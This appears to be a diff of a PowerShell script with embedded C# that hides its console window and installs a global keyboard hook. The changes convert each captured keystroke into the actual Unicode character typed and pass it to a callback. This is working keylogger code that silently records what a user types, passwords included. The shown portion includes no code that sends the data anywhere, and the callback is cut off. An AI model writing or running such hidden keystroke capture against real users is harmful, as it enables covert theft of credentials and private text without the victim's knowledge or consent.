@@ -30,11 +30,12 @@ public class Win {
 "@
 [Win]::ShowWindow([Win]::GetConsoleWindow(), [Win]::SW_HIDE)
 
-# --- Global keyboard hook via Add-Type con callback statica ---
+# --- Global keyboard hook con caratteri unicode ---
 Add-Type -TypeDefinition @"
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Windows.Forms;
 
 public class GlobalKeyboardListener {
@@ -54,6 +55,13 @@ public class GlobalKeyboardListener {
     private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
     [DllImport("kernel32.dll")]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("user32.dll")]
+    private static extern bool GetKeyboardState(byte[] lpKeyState);
+    [DllImport("user32.dll")]
+    private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
+        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
+    [DllImport("user32.dll")]
+    private static extern uint MapVirtualKey(uint uCode, uint uMapType);
 
     public static void Start() {
         using (Process cur = Process.GetCurrentProcess())
@@ -70,14 +78,26 @@ public class GlobalKeyboardListener {
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
             int vkCode = Marshal.ReadInt32(lParam);
-            string key = ((Keys)vkCode).ToString();
+            string key = null;
+            byte[] state = new byte[256];
+            if (GetKeyboardState(state)) {
+                uint scanCode = MapVirtualKey((uint)vkCode, 0);
+                var sb = new StringBuilder(2);
+                int ret = ToUnicode((uint)vkCode, scanCode, state, sb, sb.Capacity, 0);
+                if (ret > 0) {
+                    key = sb.ToString();
+                }
+            }
+            if (key == null) {
+                key = ((Keys)vkCode).ToString();
+            }
             if (Callback != null) { Callback(key); }
             if ((Keys)vkCode == Keys.Escape) { Stop(); Application.Exit(); }
         }
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
 }
-"@ -ReferencedAssemblies "System.Windows.Forms"
+"@ -ReferencedAssemblies "System.Windows.Forms","System.Text"
 
 # --- Assegna callback al listener ---
 $cb = [System.Action[string]]{
